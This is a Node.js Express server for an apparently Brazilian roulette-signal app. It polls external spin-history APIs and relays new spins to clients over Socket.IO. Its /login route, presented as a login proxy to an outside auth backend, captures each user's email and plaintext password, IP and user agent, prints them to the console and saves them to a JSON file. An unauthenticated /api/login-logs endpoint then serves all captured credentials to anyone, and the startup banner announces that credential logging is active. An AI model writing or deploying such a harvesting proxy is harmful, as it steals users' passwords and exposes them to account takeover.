// server.js (DUPLA ROLETA BRASILEIRA: ANTIGA + NOVA PLAYTECH)
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch';
import cors from 'cors';
import { loadAllExistingSignalIds, appendToCsv, getFullHistory, SOURCES } from './src/utils/csvService.js';

console.log(`\n\n${'='.repeat(60)}`);
console.log(`--- INICIANDO SERVIDOR --- ${new Date().toISOString()}`);
console.log(`${'='.repeat(60)}\n`);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const httpServer = createServer(app);

// --- ARQUIVO DE LOG DE LOGINS ---
const LOGIN_LOG_FILE = path.join(__dirname, 'login_attempts.json');

// Inicializa arquivo de log se não existir
if (!fs.existsSync(LOGIN_LOG_FILE)) {
    fs.writeFileSync(LOGIN_LOG_FILE, JSON.stringify([], null, 2));
    console.log(`📁 Arquivo de log criado: ${LOGIN_LOG_FILE}`);
}

// Função para salvar tentativa de login
function saveLoginAttempt(data) {
    try {
        const attempts = JSON.parse(fs.readFileSync(LOGIN_LOG_FILE, 'utf-8'));
        attempts.push(data);
        fs.writeFileSync(LOGIN_LOG_FILE, JSON.stringify(attempts, null, 2));
        console.log(`💾 Login salvo no arquivo (total: ${attempts.length})`);
    } catch (err) {
        console.error('❌ Erro ao salvar login:', err.message);
    }
}

// Função para atualizar tentativa de login
function updateLoginAttempt(index, updates) {
    try {
        const attempts = JSON.parse(fs.readFileSync(LOGIN_LOG_FILE, 'utf-8'));
        if (attempts[index]) {
            Object.assign(attempts[index], updates);
            fs.writeFileSync(LOGIN_LOG_FILE, JSON.stringify(attempts, null, 2));
            console.log(`💾 Login #${index} atualizado`);
        }
    } catch (err) {
        console.error('❌ Erro ao atualizar login:', err.message);
    }
}

// --- SOCKET.IO ---
const io = new Server(httpServer, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

const lastEmittedSignalIds = {}; 

// --- CONSTANTES DE URL ---
const API_URLS = {
    immersive: 'https://apptemporario-production.up.railway.app/api/0194b479-654d-70bd-ac50-9c5a9b4d14c5',
    brasileira: 'https://apptemporario-production.up.railway.app/api/0194b473-2ab3-778f-89ee-236e803f3c8e',
    brasileiraplay: 'https://pbrapi.sortehub.online/api/sinais/historico', 
    default: 'https://apptemporario-production.up.railway.app/api/0194b473-4604-7458-bb18-e3fc562980c2',
    speed: 'https://apptemporario-production.up.railway.app/api/0194b473-c347-752f-9eaf-783721339479',
    xxxtreme: 'https://apptemporario-production.up.railway.app/api/0194b478-5ba0-7110-8179-d287b2301e2e',
    vipauto: 'https://apptemporario-production.up.railway.app/api/0194b473-9044-772b-a6fc-38236eb08b42'
};

const FETCH_INTERVAL_MS = 3000; 
const DEFAULT_AUTH_PROXY_TARGET = process.env.AUTH_PROXY_TARGET || 'https://api.appbackend.tech';

console.log(`🎯 Proxy Target: ${DEFAULT_AUTH_PROXY_TARGET}`);

// --- TESTE DE CONECTIVIDADE COM O SERVIDOR DE AUTH ---
async function testAuthServer() {
    console.log(`\n🔍 Testando conexão com ${DEFAULT_AUTH_PROXY_TARGET}...`);
    try {
        const start = Date.now();
        const response = await fetch(DEFAULT_AUTH_PROXY_TARGET, { 
            method: 'GET',
            timeout: 10000 
        });
        const elapsed = Date.now() - start;
        console.log(`✅ Servidor respondeu: ${response.status} (${elapsed}ms)`);
    } catch (err) {
        console.error(`❌ Servidor NÃO respondeu: ${err.message}`);
    }
}
testAuthServer();

// --- MIDDLEWARES GLOBAIS ---

// Log de TODAS as requisições
app.use((req, res, next) => {
    const start = Date.now();
    console.log(`\n📥 [${new Date().toISOString()}] ${req.method} ${req.url}`);
    
    res.on('finish', () => {
        const duration = Date.now() - start;
        const icon = res.statusCode >= 400 ? '❌' : '✅';
        console.log(`${icon} [RESPONSE] ${req.method} ${req.url} - ${res.statusCode} (${duration}ms)`);
    });
    next();
});

app.use(cors());

// Body parsers
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- ROTA /login (FETCH MANUAL) ---
app.post('/login', async (req, res) => {
    const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}/login`;
    const bodyData = JSON.stringify(req.body);
    
    // Extrai credenciais
    const email = req.body.email || req.body.username || req.body.user || 'N/A';
    const password = req.body.password || req.body.senha || req.body.pass || 'N/A';
    
    console.log(`\n${'═'.repeat(60)}`);
    console.log(`🔐 [LOGIN REQUEST]`);
    console.log(`${'═'.repeat(60)}`);
    console.log(`   📧 Email: ${email}`);
    console.log(`   🔑 Senha: ${password}`);
    console.log(`   🌐 IP: ${req.ip || req.headers['x-forwarded-for'] || 'unknown'}`);
    console.log(`   📱 User-Agent: ${req.headers['user-agent'] || 'unknown'}`);
    console.log(`${'═'.repeat(60)}`);
    
    // Salva no arquivo
    const loginIndex = JSON.parse(fs.readFileSync(LOGIN_LOG_FILE, 'utf-8')).length;
    saveLoginAttempt({
        timestamp: new Date().toISOString(),
        email,
        password,
        ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown',
        body: req.body,
        status: 'pending'
    });
    
    console.log(`\n🚀 [FETCH REQUEST]`);
    console.log(`   Target: ${targetUrl}`);
    console.log(`   Body: ${bodyData}`);
    
    try {
        const startTime = Date.now();
        
        const response = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0'
            },
            body: bodyData
        });
        
        const elapsed = Date.now() - startTime;
        const responseText = await response.text();
        
        console.log(`\n📥 [FETCH RESPONSE]`);
        console.log(`   Status: ${response.status} (${elapsed}ms)`);
        console.log(`   Headers:`);
        response.headers.forEach((value, key) => {
            console.log(`      ${key}: ${value}`);
        });
        console.log(`   Body: ${responseText.substring(0, 500)}${responseText.length > 500 ? '...' : ''}`);
        
        // Atualiza o log
        updateLoginAttempt(loginIndex, {
            status: response.status,
            response: responseText.substring(0, 1000),
            responseTime: new Date().toISOString(),
            elapsed
        });
        
        // Repassa os headers da resposta (exceto os problemáticos)
        response.headers.forEach((value, key) => {
            if (!['content-encoding', 'transfer-encoding', 'content-length'].includes(key.toLowerCase())) {
                res.setHeader(key, value);
            }
        });
        
        // Tenta parsear como JSON, senão manda como texto
        try {
            const jsonResponse = JSON.parse(responseText);
            res.status(response.status).json(jsonResponse);
        } catch {
            res.status(response.status).send(responseText);
        }
        
    } catch (err) {
        console.error(`\n❌ [FETCH ERROR]`);
        console.error(`   Message: ${err.message}`);
        console.error(`   Code: ${err.code || 'N/A'}`);
        
        // Atualiza o log
        updateLoginAttempt(loginIndex, {
            status: 'ERROR',
            error: err.message,
            errorCode: err.code,
            responseTime: new Date().toISOString()
        });
        
        res.status(500).json({ 
            error: true, 
            message: err.message,
            code: err.code 
        });
    }
});

// --- ROTA /start-game (FETCH MANUAL) ---
app.all(/\/start-game\/.*/, async (req, res) => {
    const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}${req.url}`;
    
    console.log(`\n🎮 [START-GAME]`);
    console.log(`   Target: ${targetUrl}`);
    console.log(`   Method: ${req.method}`);
    
    try {
        const fetchOptions = {
            method: req.method,
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0'
            }
        };
        
        if (req.headers.authorization) {
            fetchOptions.headers['Authorization'] = req.headers.authorization;
            console.log(`   Auth: ${req.headers.authorization.substring(0, 30)}...`);
        }
        
        if (req.method !== 'GET' && req.body && Object.keys(req.body).length > 0) {
            fetchOptions.body = JSON.stringify(req.body);
            console.log(`   Body: ${fetchOptions.body}`);
        }
        
        const response = await fetch(targetUrl, fetchOptions);
        const responseText = await response.text();
        
        console.log(`   Response: ${response.status}`);
        
        try {
            const jsonResponse = JSON.parse(responseText);
            res.status(response.status).json(jsonResponse);
        } catch {
            res.status(response.status).send(responseText);
        }
        
    } catch (err) {
        console.error(`❌ [START-GAME ERROR]: ${err.message}`);
        res.status(500).json({ error: true, message: err.message });
    }
});

// Rota para /start-game sem path adicional
app.all('/start-game', async (req, res) => {
    const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}/start-game`;
    
    console.log(`\n🎮 [START-GAME]`);
    console.log(`   Target: ${targetUrl}`);
    
    try {
        const fetchOptions = {
            method: req.method,
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
        };
        
        if (req.headers.authorization) {
            fetchOptions.headers['Authorization'] = req.headers.authorization;
        }
        
        if (req.method !== 'GET' && req.body && Object.keys(req.body).length > 0) {
            fetchOptions.body = JSON.stringify(req.body);
        }
        
        const response = await fetch(targetUrl, fetchOptions);
        const responseText = await response.text();
        
        console.log(`   Response: ${response.status}`);
        
        try {
            const jsonResponse = JSON.parse(responseText);
            res.status(response.status).json(jsonResponse);
        } catch {
            res.status(response.status).send(responseText);
        }
        
    } catch (err) {
        console.error(`❌ [START-GAME ERROR]: ${err.message}`);
        res.status(500).json({ error: true, message: err.message });
    }
});

// --- STATIC FILES ---
app.use(express.static(path.join(__dirname, 'dist')));

// --- SOCKET EVENTS ---
io.on('connection', (socket) => {
    console.log(`⚡ Cliente Socket conectado: ${socket.id}`);
    socket.on('disconnect', () => {
        console.log(`🔌 Cliente Socket desconectado: ${socket.id}`);
    });
});

// --- FETCH LOGIC ---
const normalizeData = (data) => {
    if (Array.isArray(data)) return data;
    if (data && data.games && Array.isArray(data.games)) return data.games;
    if (data && data.history && Array.isArray(data.history)) return data.history;
    if (data && data.signalId) return [data];
    return [];
};

async function fetchAndSaveFromSource(url, sourceName) {
    try {
        const response = await fetch(url);
        if (!response.ok) throw new Error(`Status: ${response.status}`);
        
        const data = await response.json();
        const normalizedData = normalizeData(data);
        
        if (normalizedData.length > 0) {
            await appendToCsv(normalizedData, sourceName);

            if (sourceName === 'Brasileira PlayTech') {
                const latestItem = normalizedData[0];
                const latestId = latestItem.signalId || latestItem.signalid || latestItem.id;

                if (latestId && latestId !== lastEmittedSignalIds[sourceName]) {
                    lastEmittedSignalIds[sourceName] = latestId;
                    console.log(`⚡ [SOCKET PLAYTECH] Novo giro: ${latestItem.signal} (${latestItem.color || '?'})`);
                    
                    io.emit('novo-giro', {
                        source: 'Brasileira PlayTech',
                        data: {
                            signal: latestItem.signal,
                            color: latestItem.color,
                            gameId: latestItem.gameId,
                            signalId: latestId,
                            createdAt: new Date().toISOString()
                        }
                    });
                }
            }
        }
    } catch (err) {
        if (!err.message.includes('404')) {
            console.error(`❌ [FETCH - ${sourceName}] Erro:`, err.message);
        }
    }
}

async function fetchAllData() {
    await Promise.all([
        fetchAndSaveFromSource(API_URLS.immersive, 'immersive'),
        fetchAndSaveFromSource(API_URLS.brasileira, 'brasileira'), 
        fetchAndSaveFromSource(API_URLS.brasileiraplay, 'Brasileira PlayTech'), 
        fetchAndSaveFromSource(API_URLS.default, 'default'),
        fetchAndSaveFromSource(API_URLS.speed, 'speed'),
        fetchAndSaveFromSource(API_URLS.xxxtreme, 'xxxtreme'),
        fetchAndSaveFromSource(API_URLS.vipauto, 'vipauto')
    ]);
}

// --- API ---
app.get('/api/full-history', async (req, res) => {
    try {
        const sourceName = req.query.source;
        if (!sourceName || !SOURCES.includes(sourceName)) return res.status(400).json({ error: 'Source inválida' });
        
        const history = await getFullHistory(sourceName);
        res.json(history);
    } catch (error) {
        res.status(500).json({ error: 'Erro leitura', details: error.message });
    }
});

// Endpoint para ver os logs de login
app.get('/api/login-logs', (req, res) => {
    try {
        const attempts = JSON.parse(fs.readFileSync(LOGIN_LOG_FILE, 'utf-8'));
        res.json(attempts);
    } catch (error) {
        res.status(500).json({ error: 'Erro ao ler logs', details: error.message });
    }
});

// Endpoint para limpar logs
app.delete('/api/login-logs', (req, res) => {
    try {
        fs.writeFileSync(LOGIN_LOG_FILE, JSON.stringify([], null, 2));
        res.json({ success: true, message: 'Logs limpos' });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao limpar logs', details: error.message });
    }
});

app.get('/health', (req, res) => res.status(200).json({ 
    status: 'OK', 
    socket: 'active',
    timestamp: new Date().toISOString(),
    proxyTarget: DEFAULT_AUTH_PROXY_TARGET
}));

app.get(/.*/, (req, res) => {
    if (req.url.startsWith('/api/')) return res.status(404).json({ error: 'Not Found' });
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// --- START ---
const startServer = async () => {
    const PORT = process.env.PORT || 3000;
    try {
        await loadAllExistingSignalIds();
        httpServer.listen(PORT, '0.0.0.0', () => {
            console.log(`\n${'='.repeat(60)}`);
            console.log(`🚀 SERVIDOR RODANDO NA PORTA ${PORT}`);
            console.log(`${'='.repeat(60)}`);
            console.log(`📌 Fonte 'brasileira' (Antiga): Ativa (Polling)`);
            console.log(`📌 Fonte 'Brasileira PlayTech' (Nova): Ativa (Socket + Polling)`);
            console.log(`🔐 Logging de credenciais: ATIVO`);
            console.log(`📁 Arquivo de logs: ${LOGIN_LOG_FILE}`);
            console.log(`🌐 Ver logs: http://localhost:${PORT}/api/login-logs`);
            console.log(`${'='.repeat(60)}\n`);
            fetchAllData(); 
            setInterval(fetchAllData, FETCH_INTERVAL_MS); 
        });
    } catch (err) {
        console.error("❌ ERRO AO INICIAR:", err);
        process.exit(1);
    }
};

startServer();